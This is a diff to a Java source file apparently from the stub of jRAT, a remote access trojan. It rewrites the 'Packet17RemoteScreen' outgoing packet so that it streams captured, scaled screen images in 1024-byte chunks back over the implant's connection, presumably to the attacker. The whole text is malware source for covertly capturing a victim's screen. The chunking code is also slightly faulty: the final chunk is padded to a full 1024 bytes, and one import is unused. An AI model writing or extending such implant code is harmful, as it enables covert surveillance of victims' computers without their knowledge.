@@ -1,26 +1,42 @@
 package pro.jrat.stub.packets.outgoing;
 
+import java.io.ByteArrayInputStream;
 import java.io.DataOutputStream;
+import java.io.FileOutputStream;
 
 import pro.jrat.common.io.StringWriter;
 
 public class Packet17RemoteScreen extends AbstractOutgoingPacket {
+	
+	private byte[] array;
+	private int scaledWidth;
+	private int scaledHeight;
 
-	private int width;
-	private int height;
-	private int x;
-	private int y;
-
-	public Packet17RemoteScreen(int width, int height, int x, int y) {
-		this.width = width;
-		this.height = height;
-		this.x = x;
-		this.y = y;
+	public Packet17RemoteScreen(byte[] array, int scaledWidth, int scaledHeight) {
+		this.array = array;
+		this.scaledWidth = scaledWidth;
+		this.scaledHeight = scaledHeight;
 	}
 
 	@Override
 	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
+		ByteArrayInputStream bais = new ByteArrayInputStream(array);
 		
+		dos.writeInt(scaledWidth);
+		dos.writeInt(scaledHeight);
+		
+		dos.writeInt(array.length);
+		
+		byte[] chunk = new byte[1024];
+		
+		for (long pos = 0; pos < array.length; pos += 1024) {
+			bais.read(chunk);
+			
+			dos.writeInt(chunk.length);
+			dos.write(chunk, 0, chunk.length);
+		}
+
+		dos.writeInt(-1);	
 	}
 
 	@Override
